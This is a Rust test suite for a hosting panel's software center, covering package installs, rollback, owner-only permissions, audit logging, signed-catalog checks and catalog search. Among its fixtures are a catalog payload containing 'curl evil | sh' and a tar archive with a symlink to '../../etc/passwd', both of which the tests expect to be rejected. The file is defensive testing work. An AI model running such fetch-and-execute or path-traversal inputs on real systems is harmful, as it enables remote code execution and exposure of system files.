#![allow(missing_docs)]
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::{
    collections::BTreeSet,
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
};

use async_trait::async_trait;
use base64::Engine;
use ed25519_dalek::{Signer, SigningKey};
use openpanel_app::software_center::{
    ApplicationDeployer, ApplicationDeploymentInput, ApplicationDeploymentResources,
    ApplicationResource, AptPackageManager, ArtifactDigest, CatalogVerifier, CommandResult,
    ComponentAction, CreatedApplicationDatabase, CreatedApplicationSite, HostSnapshot,
    IntegratedApplicationDeployer, PackageCommand, PackageManager, ProvisionedApplication,
    SafeArtifactInstaller, SignedCatalogEnvelope, SoftwareCenterError, SoftwareCenterService,
};
use openpanel_core::{AuditAction, AuditOutcome};
use openpanel_domain::{
    Role,
    software_center::{PackageId, PlanAction},
};
use openpanel_test_support::MockAudit;
use uuid::Uuid;

mockall::mock! {Packages{}
#[async_trait]
impl PackageManager for Packages {
    async fn discover(&self) -> Result<HostSnapshot, SoftwareCenterError>;
    async fn apply(&self, actions: &[PlanAction]) -> Result<(), SoftwareCenterError>;
    async fn validate(&self, component: &str) -> Result<(), SoftwareCenterError>;
    async fn rollback(&self, actions: &[PlanAction]) -> Result<(), SoftwareCenterError>;
}}
mockall::mock! {Command{}
#[async_trait]
impl PackageCommand for Command {
    async fn run(&self, program: &'static str, arguments: &[String]) -> Result<CommandResult, SoftwareCenterError>;
}}
mockall::mock! {Applications{}
#[async_trait]
impl ApplicationDeployer for Applications {
    async fn provision(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<ProvisionedApplication, SoftwareCenterError>;
    async fn validate(&self, deployment: &ProvisionedApplication) -> Result<(), SoftwareCenterError>;
    async fn rollback(&self, deployment: &ProvisionedApplication) -> Result<(), SoftwareCenterError>;
}}
mockall::mock! {DeploymentResources{}
#[async_trait]
impl ApplicationDeploymentResources for DeploymentResources {
    async fn create_site(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<CreatedApplicationSite, SoftwareCenterError>;
    async fn create_database(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<CreatedApplicationDatabase, SoftwareCenterError>;
    async fn install_application(&self, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite, database: &CreatedApplicationDatabase, admin_username: &str, admin_password: &str) -> Result<(), SoftwareCenterError>;
    async fn create_dns(&self, input: &ApplicationDeploymentInput) -> Result<String, SoftwareCenterError>;
    async fn create_tls(&self, input: &ApplicationDeploymentInput) -> Result<(), SoftwareCenterError>;
    async fn create_backup(&self, actor: Uuid, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite) -> Result<Uuid, SoftwareCenterError>;
    async fn validate_application(&self, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite) -> Result<(), SoftwareCenterError>;
    async fn remove(&self, resource: &ApplicationResource) -> Result<(), SoftwareCenterError>;
}}

struct BlockingPackages {
    entered: tokio::sync::Notify,
    proceed: tokio::sync::Notify,
    rolled_back: AtomicBool,
}
#[async_trait]
impl PackageManager for BlockingPackages {
    async fn discover(&self) -> Result<HostSnapshot, SoftwareCenterError> {
        Ok(HostSnapshot::test("same-state"))
    }

    async fn apply(&self, _actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        self.entered.notify_one();
        self.proceed.notified().await;
        Ok(())
    }

    async fn validate(&self, _component: &str) -> Result<(), SoftwareCenterError> {
        Ok(())
    }

    async fn rollback(&self, _actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        self.rolled_back.store(true, Ordering::SeqCst);
        Ok(())
    }
}

#[test]
fn embedded_recovery_catalog_contains_initial_components_and_applications() {
    let packages = MockPackages::new();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let ids: Vec<_> = runtime.block_on(async {
        service
            .catalog(Role::Owner)
            .await
            .unwrap()
            .into_iter()
            .map(|entry| entry.id)
            .collect()
    });
    for expected in [
        "nginx",
        "php-7.4",
        "php-8.3",
        "mysql",
        "mariadb",
        "redis",
        "wordpress",
        "drupal",
    ] {
        assert!(ids.iter().any(|id| id == expected), "missing {expected}");
    }
    assert!(runtime.block_on(async { service.catalog(Role::Admin).await.is_err() }));
    let php = runtime.block_on(async {
        service
            .catalog(Role::Owner)
            .await
            .unwrap()
            .into_iter()
            .find(|entry| entry.id == "php-8.3")
            .unwrap()
    });
    assert!(php.description.contains("PHP-FPM"));
    assert!(php.versions.contains(&"8.3.6".to_owned()));
    assert!(
        php.packages
            .iter()
            .any(|package| package.as_str() == "php8.3-mysql")
    );
    assert!(!php.versions.is_empty());
    assert_eq!(
        php.provenance,
        "https://catalog.openpanel.invalid/v1/manifest.json"
    );
}

#[tokio::test]
async fn discovery_reports_external_components_without_taking_ownership() {
    let mut packages = MockPackages::new();
    packages.expect_discover().once().returning(|| {
        let mut snapshot = HostSnapshot::test("state");
        snapshot.installed_packages = BTreeSet::from(["nginx".to_owned()]);
        Ok(snapshot)
    });
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let inventory = service.inventory(Role::Owner).await.unwrap();
    let nginx = inventory.iter().find(|entry| entry.id == "nginx").unwrap();
    assert_eq!(nginx.state, "externally_managed");
    assert_eq!(
        inventory
            .iter()
            .find(|entry| entry.id == "redis")
            .unwrap()
            .state,
        "available"
    );
}

#[tokio::test]
async fn stale_host_state_rejects_execution_before_package_mutation() {
    let mut packages = MockPackages::new();
    let mut sequence = mockall::Sequence::new();
    packages
        .expect_discover()
        .once()
        .in_sequence(&mut sequence)
        .returning(|| Ok(HostSnapshot::test("state-a")));
    packages
        .expect_discover()
        .once()
        .in_sequence(&mut sequence)
        .returning(|| Ok(HostSnapshot::test("state-b")));
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "redis")
        .await
        .unwrap();
    assert_eq!(preview.packages, ["redis-server"]);
    assert!(
        preview
            .estimated_download_bytes
            .is_some_and(|value| value > 0)
    );
    assert!(
        preview
            .estimated_disk_delta_bytes
            .is_some_and(|value| value > 0)
    );
    assert_eq!(
        preview.configuration_paths,
        ["/etc/openpanel/software/redis"]
    );
    assert!(preview.rollback_supported);
    assert!(matches!(
        service
            .execute(
                actor,
                Role::Owner,
                preview.plan.digest(),
                &preview.confirmation_token
            )
            .await,
        Err(SoftwareCenterError::Conflict)
    ));
}

#[tokio::test]
async fn failed_post_install_validation_rolls_back_and_never_reports_success() {
    let mut packages = MockPackages::new();
    packages
        .expect_discover()
        .times(2)
        .returning(|| Ok(HostSnapshot::test("same-state")));
    packages.expect_apply().once().returning(|actions| {
        assert_eq!(actions.len(), 1);
        Ok(())
    });
    packages
        .expect_validate()
        .once()
        .withf(|component| component == "nginx")
        .returning(|_| Err(SoftwareCenterError::Validation));
    packages.expect_rollback().once().returning(|_| Ok(()));
    let mut audit = MockAudit::new();
    audit
        .expect_record()
        .once()
        .withf(|event| {
            event.action == AuditAction::SoftwareChanged
                && event.outcome == AuditOutcome::Success
                && event.metadata["operation"] == "component_previewed"
        })
        .returning(|_| Ok(()));
    audit
        .expect_record()
        .once()
        .withf(|event| {
            event.action == AuditAction::SoftwareChanged
                && event.outcome == AuditOutcome::Failure
                && event.metadata["operation"] == "validation_failed"
        })
        .returning(|_| Ok(()));
    audit.expect_recent().returning(|_| Ok(Vec::new()));
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(audit));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "nginx")
        .await
        .unwrap();
    let job = service
        .execute(
            actor,
            Role::Owner,
            preview.plan.digest(),
            &preview.confirmation_token,
        )
        .await
        .unwrap_err();
    assert_eq!(job, SoftwareCenterError::Validation);
    assert_eq!(service.jobs(Role::Owner).await.unwrap()[0].state, "failed");
}

#[tokio::test]
async fn non_owner_is_rejected_before_discovery_or_commands() {
    let mut packages = MockPackages::new();
    packages.expect_discover().never();
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    assert!(matches!(
        service
            .preview_install(Uuid::new_v4(), Role::Admin, "redis")
            .await,
        Err(SoftwareCenterError::Forbidden)
    ));
}

#[tokio::test]
async fn apt_adapter_uses_fixed_program_and_end_of_options_before_validated_packages() {
    let mut command = MockCommand::new();
    command
        .expect_run()
        .once()
        .withf(|program, arguments| {
            program == "/usr/bin/apt-get" && arguments == ["-y", "install", "--", "redis-server"]
        })
        .returning(|_, _| Ok(CommandResult::success("installed")));
    let adapter = AptPackageManager::new(Arc::new(command));
    adapter
        .apply(&[PlanAction::install(PackageId::new("redis-server").unwrap())])
        .await
        .unwrap();
}

#[test]
fn package_diagnostics_are_bounded_and_redact_secret_bearing_lines() {
    let result = CommandResult::success(&format!(
        "normal line\npassword=super-secret\n{}",
        "x".repeat(20_000)
    ));
    assert!(result.output.contains("normal line"));
    assert!(!result.output.contains("super-secret"));
    assert!(result.output.len() <= 8_192);
}

#[tokio::test]
async fn failed_application_health_check_unwinds_job_created_resources() {
    let mut packages = MockPackages::new();
    packages
        .expect_discover()
        .times(2)
        .returning(|| Ok(HostSnapshot::test("same-state")));
    packages.expect_apply().once().returning(|_| Ok(()));
    packages.expect_rollback().once().returning(|_| Ok(()));
    let mut applications = MockApplications::new();
    applications.expect_provision().once().returning(|_, _| {
        Ok(ProvisionedApplication::test(
            vec!["site:example.test", "database:wp_example"],
            "admin",
            "one-time-secret",
        ))
    });
    applications
        .expect_validate()
        .once()
        .returning(|_| Err(SoftwareCenterError::Validation));
    applications
        .expect_rollback()
        .once()
        .withf(|deployment| deployment.resources == ["site:example.test", "database:wp_example"])
        .returning(|_| Ok(()));
    let service = SoftwareCenterService::with_deployer(
        Arc::new(packages),
        Arc::new(applications),
        Arc::new(MockAudit::stub()),
    );
    let actor = Uuid::new_v4();
    let preview = service
        .preview_deployment(
            actor,
            Role::Owner,
            ApplicationDeploymentInput::test("wordpress", "example.test", "8.3"),
        )
        .await
        .unwrap();
    assert!(matches!(
        service
            .execute_deployment(
                actor,
                Role::Owner,
                preview.plan.digest(),
                &preview.confirmation_token,
            )
            .await,
        Err(SoftwareCenterError::Validation)
    ));
    let serialized = serde_json::to_string(&service.jobs(Role::Owner).await.unwrap()).unwrap();
    assert!(!serialized.contains("one-time-secret"));
}

#[tokio::test]
async fn integrated_application_failure_removes_only_created_resources_in_reverse_order() {
    let actor = Uuid::new_v4();
    let site_id = Uuid::new_v4();
    let database_id = Uuid::new_v4();
    let mut sequence = mockall::Sequence::new();
    let mut resources = MockDeploymentResources::new();
    resources
        .expect_create_site()
        .once()
        .in_sequence(&mut sequence)
        .returning(move |_, _| {
            Ok(CreatedApplicationSite {
                id: site_id,
                document_root: "/var/www/example.test/public_html".into(),
            })
        });
    resources
        .expect_create_database()
        .once()
        .in_sequence(&mut sequence)
        .returning(move |_, _| {
            Ok(CreatedApplicationDatabase {
                id: database_id,
                name: "software_wp_example".into(),
                username: "software_wp_example".into(),
                host: "localhost".into(),
                password: "database-secret".into(),
            })
        });
    resources
        .expect_install_application()
        .once()
        .in_sequence(&mut sequence)
        .withf(|input, _, _, username, password| {
            input.application == "wordpress"
                && username == "openpanel-admin"
                && password.len() == 24
        })
        .returning(|_, _, _, _, _| Err(SoftwareCenterError::Validation));
    resources
        .expect_remove()
        .once()
        .in_sequence(&mut sequence)
        .withf(move |resource| {
            matches!(resource, ApplicationResource::Database { id } if *id == database_id)
        })
        .returning(|_| Ok(()));
    resources
        .expect_remove()
        .once()
        .in_sequence(&mut sequence)
        .withf(move |resource| {
            matches!(resource, ApplicationResource::Site { id, .. } if *id == site_id)
        })
        .returning(|_| Ok(()));
    resources.expect_create_dns().never();
    resources.expect_create_tls().never();
    resources.expect_create_backup().never();
    resources.expect_validate_application().never();

    let deployer = IntegratedApplicationDeployer::new(Arc::new(resources));
    let result = deployer
        .provision(
            actor,
            &ApplicationDeploymentInput::test("wordpress", "example.test", "8.3"),
        )
        .await;
    assert_eq!(result.unwrap_err(), SoftwareCenterError::Validation);
}

#[tokio::test]
async fn external_component_requires_explicit_adoption_before_removal() {
    let mut packages = MockPackages::new();
    packages.expect_discover().times(5).returning(|| {
        let mut snapshot = HostSnapshot::test("same-state");
        snapshot.installed_packages = BTreeSet::from(["redis-server".to_owned()]);
        Ok(snapshot)
    });
    packages.expect_validate().once().returning(|_| Ok(()));
    packages.expect_apply().once().withf(|actions| {
        matches!(actions, [PlanAction::Remove(package)] if package.as_str() == "redis-server")
    }).returning(|_| Ok(()));
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let actor = Uuid::new_v4();
    assert!(matches!(
        service
            .preview_component(actor, Role::Owner, "redis", ComponentAction::Remove)
            .await,
        Err(SoftwareCenterError::Conflict)
    ));
    let adoption = service
        .preview_component(actor, Role::Owner, "redis", ComponentAction::Adopt)
        .await
        .unwrap();
    service
        .execute(
            actor,
            Role::Owner,
            adoption.plan.digest(),
            &adoption.confirmation_token,
        )
        .await
        .unwrap();
    let removal = service
        .preview_component(actor, Role::Owner, "redis", ComponentAction::Remove)
        .await
        .unwrap();
    service
        .execute(
            actor,
            Role::Owner,
            removal.plan.digest(),
            &removal.confirmation_token,
        )
        .await
        .unwrap();
}

#[test]
fn remote_catalog_requires_valid_signature_schema_expiry_and_strict_payload() {
    let signing = SigningKey::from_bytes(&[7_u8; 32]);
    let verifier = CatalogVerifier::new(signing.verifying_key().to_bytes());
    let payload = r#"{"entries":[{"id":"redis","name":"Redis"}]}"#;
    let signed = format!("1\n2000\n{payload}");
    let signature = base64::engine::general_purpose::STANDARD
        .encode(signing.sign(signed.as_bytes()).to_bytes());
    let envelope = SignedCatalogEnvelope {
        schema: 1,
        expires_at: 2000,
        payload: payload.to_owned(),
        signature,
    };
    assert!(verifier.verify(&envelope, 1000).is_ok());
    let mut tampered = envelope.clone();
    tampered.payload.push(' ');
    assert!(verifier.verify(&tampered, 1000).is_err());
    let mut expired = envelope.clone();
    expired.expires_at = 999;
    assert!(verifier.verify(&expired, 1000).is_err());
    let unknown = r#"{"entries":[],"recipe":"curl evil | sh"}"#;
    let signed = format!("1\n2000\n{unknown}");
    let strict = SignedCatalogEnvelope {
        schema: 1,
        expires_at: 2000,
        payload: unknown.to_owned(),
        signature: base64::engine::general_purpose::STANDARD
            .encode(signing.sign(signed.as_bytes()).to_bytes()),
    };
    assert!(verifier.verify(&strict, 1000).is_err());
}

#[test]
fn verified_artifacts_extract_under_staging_and_reject_symlinks_or_tampering() {
    use std::io::Read;

    use flate2::{Compression, write::GzEncoder};
    use sha2::{Digest, Sha256};

    fn archive(symlink: bool) -> Vec<u8> {
        let encoder = GzEncoder::new(Vec::new(), Compression::default());
        let mut tar = tar::Builder::new(encoder);
        if symlink {
            let mut header = tar::Header::new_gnu();
            header.set_entry_type(tar::EntryType::Symlink);
            header.set_size(0);
            header.set_mode(0o777);
            header.set_cksum();
            tar.append_link(&mut header, "wordpress/escape", "../../etc/passwd")
                .unwrap();
        } else {
            let body = b"<?php echo 'healthy';";
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, "wordpress/index.php", &body[..])
                .unwrap();
        }
        tar.into_inner().unwrap().finish().unwrap()
    }

    let bytes = archive(false);
    let digest = ArtifactDigest::sha256(&hex::encode(Sha256::digest(&bytes))).unwrap();
    let root = tempfile::tempdir().unwrap();
    SafeArtifactInstaller::default()
        .extract_verified(&bytes, &digest, "wordpress", root.path())
        .unwrap();
    let mut content = String::new();
    std::fs::File::open(root.path().join("index.php"))
        .unwrap()
        .read_to_string(&mut content)
        .unwrap();
    assert!(content.contains("healthy"));
    let mut tampered = bytes.clone();
    tampered.push(0);
    assert!(
        SafeArtifactInstaller::default()
            .extract_verified(&tampered, &digest, "wordpress", root.path())
            .is_err()
    );
    let linked = archive(true);
    let linked_digest = ArtifactDigest::sha256(&hex::encode(Sha256::digest(&linked))).unwrap();
    let linked_root = tempfile::tempdir().unwrap();
    assert!(
        SafeArtifactInstaller::default()
            .extract_verified(&linked, &linked_digest, "wordpress", linked_root.path())
            .is_err()
    );
}

#[tokio::test]
async fn cancellation_waits_for_package_checkpoint_then_rolls_back() {
    let packages = Arc::new(BlockingPackages {
        entered: tokio::sync::Notify::new(),
        proceed: tokio::sync::Notify::new(),
        rolled_back: AtomicBool::new(false),
    });
    let service = Arc::new(SoftwareCenterService::new(
        packages.clone(),
        Arc::new(MockAudit::stub()),
    ));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "redis")
        .await
        .unwrap();
    let digest = preview.plan.digest().to_owned();
    let token = preview.confirmation_token;
    let running_service = service.clone();
    let running = tokio::spawn(async move {
        running_service
            .execute(actor, Role::Owner, &digest, &token)
            .await
    });
    packages.entered.notified().await;
    let active = service.jobs(Role::Owner).await.unwrap();
    assert_eq!(active[0].state, "running");
    let pending = service
        .cancel(actor, Role::Owner, active[0].id)
        .await
        .unwrap();
    assert_eq!(pending.state, "cancellation_pending");
    packages.proceed.notify_one();
    let cancelled = running.await.unwrap().unwrap();
    assert_eq!(cancelled.state, "cancelled");
    assert!(packages.rolled_back.load(Ordering::SeqCst));
}

// ---------------------------------------------------------------------------
// Aggregator tests — exercise the new `source`, `seed`, and `store` modules.
// ---------------------------------------------------------------------------

use openpanel_app::software_center::{
    CatalogQuery, CatalogSource, CompatibilityHost, EmbeddedCatalogSource, HttpCatalogSource,
    HttpSourceConfig, SoftwareCatalogStore, StaticCatalogSource, default_catalog_url,
    seed::embedded_manifest,
};
use openpanel_test_support::TestDb;

async fn build_store() -> (SoftwareCatalogStore, TestDb) {
    let db = TestDb::new().await;
    // TestDb only runs the core migrations; run the software-center
    // V001 + V002 migrations so the aggregator store has its tables.
    let pool = db.pool();
    sqlx::query(openpanel_app::migrations::SOFTWARE_CENTER_V001)
        .execute(&pool)
        .await
        .expect("software_center V001");
    sqlx::query(openpanel_app::migrations::SOFTWARE_CENTER_V002)
        .execute(&pool)
        .await
        .expect("software_center V002");
    let store = SoftwareCatalogStore::new(Some(pool));
    (store, db)
}

#[tokio::test]
async fn embedded_seed_materializes_into_the_store_on_first_boot() {
    let (store, _db) = build_store().await;
    assert!(!store.has_active_snapshot().await);
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    let activation = store
        .materialize_seed_if_empty(&embedded)
        .await
        .unwrap()
        .expect("seed materializes on empty store");
    assert!(activation.embedded);
    assert!(activation.entry_count >= 25);
    assert!(store.has_active_snapshot().await);
}

#[tokio::test]
async fn materializing_a_second_time_is_a_no_op() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_some()
    );
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_none()
    );
}

#[tokio::test]
async fn search_filters_by_text_category_and_tag() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let query = CatalogQuery {
        text: Some("redis".into()),
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    let ids: Vec<_> = page.hits.iter().map(|hit| hit.id.as_str()).collect();
    assert!(ids.contains(&"redis"));
    let query = CatalogQuery {
        categories: vec![openpanel_domain::software_center::Category::Database],
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    assert!(page.hits.iter().all(|hit| matches!(
        hit.category,
        openpanel_domain::software_center::Category::Database
    )));
    let query = CatalogQuery {
        tags: vec![openpanel_domain::software_center::Tag::new("php").unwrap()],
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    assert!(
        !page.hits.is_empty(),
        "expected at least one hit for tag 'php', got {page:?}"
    );
    assert!(
        page.hits
            .iter()
            .all(|hit| hit.tags.contains(&"php".to_string()))
    );
}

#[tokio::test]
async fn entry_lookup_returns_versions_tags_and_provenance() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let entry = store
        .get_entry("nginx")
        .await
        .unwrap()
        .expect("nginx must be present");
    assert_eq!(entry.id, "nginx");
    assert!(!entry.versions.is_empty());
    assert!(!entry.tags.is_empty());
    assert!(entry.provenance.embedded);
    assert!(entry.provenance.entry_count >= 25);
    assert!(store.get_entry("does-not-exist").await.unwrap().is_none());
}

#[tokio::test]
async fn compatibility_report_rejects_missing_php_runtime() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let host = CompatibilityHost::default();
    let report = store
        .compatibility_for("nextcloud", "29.0.1", &host, &[], &[("mysql".into(), true)])
        .await
        .unwrap();
    assert!(
        !report.is_compatible(),
        "expected compatibility errors, got {report:?}"
    );
    assert!(
        report
            .errors
            .iter()
            .any(|issue| issue.code == "missing_php_runtime")
    );
}

#[tokio::test]
async fn compatibility_report_rejects_conflict_when_already_managed() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let host = CompatibilityHost::default();
    let report = store
        .compatibility_for("mariadb", "10.11.6", &host, &[], &[("mysql".into(), true)])
        .await
        .unwrap();
    assert!(
        report
            .errors
            .iter()
            .any(|issue| issue.code == "conflict_installed")
    );
}

#[tokio::test]
async fn static_source_returns_its_manifest() {
    let manifest = embedded_manifest().unwrap();
    let source = StaticCatalogSource::new("https://example.com/manifest.json", manifest);
    let fetched = source.fetch(0).await.unwrap();
    assert_eq!(fetched.source_url, "https://example.com/manifest.json");
    assert!(!fetched.manifest.entries.is_empty());
}

#[tokio::test]
async fn http_source_rejects_off_allowlist_origin() {
    let config = HttpSourceConfig::new(
        "https://evil.example.com/manifest.json",
        std::collections::BTreeSet::from(["catalog.openpanel.dev".to_string()]),
    );
    let source = HttpCatalogSource::new(config).unwrap();
    let result = source.fetch(0).await;
    assert!(matches!(
        result,
        Err(openpanel_app::software_center::SoftwareCenterError::Invalid)
    ));
}

#[tokio::test]
async fn diagnostics_reflect_last_refresh_attempt() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    store
        .record_refresh(
            "https://catalog.openpanel.dev/v1/manifest.json",
            "success",
            Some("digest"),
            None,
        )
        .await
        .unwrap();
    let diag = store.diagnostics().await.unwrap();
    assert_eq!(diag.source_id, "embedded");
    assert!(diag.entry_count >= 25);
    assert!(diag.last_refresh.is_some());
    assert_eq!(diag.last_refresh.as_ref().unwrap().outcome, "success");
}

#[tokio::test]
async fn search_respects_installed_only_toggle() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    sqlx::query("INSERT INTO software_components(id, version, status, managed, state_digest, updated_at) VALUES(?,?,?,?,?,?)")
        .bind("nginx")
        .bind("1.24.0")
        .bind("installed")
        .bind(1_i64)
        .bind("digest")
        .bind("2024-01-01T00:00:00Z")
        .execute(&_db.pool())
        .await
        .unwrap();
    let query = CatalogQuery {
        installed_only: true,
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    let ids: Vec<_> = page.hits.iter().map(|hit| hit.id.as_str()).collect();
    assert!(ids.contains(&"nginx"));
}

#[test]
fn catalog_sort_label_is_stable() {
    use openpanel_domain::software_center::{CatalogSearchPage, CatalogSort};
    let query = CatalogQuery {
        sort: CatalogSort::Recent,
        ..CatalogQuery::default()
    };
    let page = CatalogSearchPage::empty(&query);
    assert_eq!(page.sort, "recent");
}
